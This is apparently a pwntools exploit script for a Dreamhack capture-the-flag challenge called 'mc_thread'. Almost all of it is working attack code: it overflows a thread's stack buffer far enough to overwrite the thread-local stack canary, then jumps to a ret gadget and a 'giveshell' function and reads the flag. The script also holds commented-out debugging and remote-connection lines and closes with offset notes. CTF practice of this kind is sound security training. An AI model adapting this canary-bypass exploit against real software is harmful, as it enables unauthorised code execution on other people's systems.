from pwn import *

io = process("./mc_thread_patched", )

# io = gdb.debug("./mc_thread_patched", gdbscript='''
# b *0x0000000000401396
# c
# ''')

# io = remote('host3.dreamhack.games', 20169)

elf = context.binary = ELF('./mc_thread_patched')

context.log_level = 'info'

payload = b'A'*264 + b'B'*8 + b'A'*8 + p64(0x000000000040101a) + p64(elf.sym['giveshell'])
payload += p64(0x0000000000404080)*int((0x928-len(payload))/8) + b'B'*24

# payload = b'A'*256 + b'B'*8 + b'B'*8 + b'A'*8 + p64(0x000000000040101a) + p64(elf.sym['giveshell'])
# payload += b'A'*(0x928-len(payload)) + p64(0x4242424242424242)

io.sendlineafter(b'Size: ', str(len(payload)))
info(f'Size: {len(payload)}')
io.sendlineafter(b'Data: ',payload)
# info(f'Data: {payload}')
sleep(1)
io.sendline(b'cat flag')

io.interactive()

'''
start of stack = 0x7ffff79ffd40


fs:0x28 = 

offset from stack = 0x928

working locally

'''